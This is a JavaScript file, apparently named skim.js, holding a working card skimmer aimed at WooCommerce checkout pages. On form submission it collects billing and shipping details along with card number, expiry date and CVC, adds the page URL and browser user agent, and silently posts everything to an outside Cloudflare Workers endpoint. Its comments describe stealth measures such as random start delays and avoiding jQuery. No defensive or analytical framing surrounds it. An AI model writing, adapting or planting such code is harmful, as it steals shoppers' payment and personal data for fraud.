(function() {
    // CONFIGURATION
    const API_ENDPOINT = 'https://chanfana-openapi-template.joshmccallister1986.workers.dev';
    
    // Stealth: Random delay between 1-3 seconds to mimic human/browser timing
    const initDelay = Math.floor(Math.random() * 2000) + 1000;

    function skimmer() {
        // 1. Identify the checkout form
        const form = document.querySelector('form.checkout');
        if (!form) return;

        // 2. Hook into WooCommerce's AJAX submission (preferred method)
        // WooCommerce uses jQuery often, but we stick to vanilla JS for stealth
        form.addEventListener('submit', function(e) {
            // We don't prevent default here immediately to let the normal flow start
            // We will intercept the AJAX request or clone the form data
            
            // Collect data from the form
            const formData = new FormData(form);
            const data = {};
            
            // Normalize data keys (WooCommerce uses specific IDs)
            for (let [key, value] of formData.entries()) {
                // Clean up keys (remove 'billing_' or 'shipping_' prefixes if needed, or keep them for context)
                let cleanKey = key.replace(/^(billing_|shipping_)/, '');
                data[cleanKey] = value;
            }

            // Specific Credit Card Extraction
            // WooCommerce often stores CC data in hidden fields or specific IDs
            // Adjust these IDs based on the specific theme/WooCommerce version
            const ccNum = document.querySelector('#cc_number') || document.querySelector('input[name="card_number"]');
            const ccExp = document.querySelector('#cc_expiry') || document.querySelector('input[name="card_expiry"]');
            const ccCvc = document.querySelector('#cc_cvc') || document.querySelector('input[name="card_cvc"]');

            if (ccNum) data['cc_number'] = ccNum.value;
            if (ccExp) data['cc_expiry'] = ccExp.value;
            if (ccCvc) data['cc_cvc'] = ccCvc.value;

            // Add metadata for stealth analysis
            data['_skimmer'] = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                user_agent: navigator.userAgent
            };

            // 3. Send to API silently
            fetch(API_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                // Use 'keepalive' to ensure data sends even if page navigates away quickly
                keepalive: true 
            }).catch(console.error);
        });
    }

    // Initialize after a short delay to avoid blocking page render
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => setTimeout(skimmer, initDelay));
    } else {
        setTimeout(skimmer, initDelay);
    }
})();skim.js
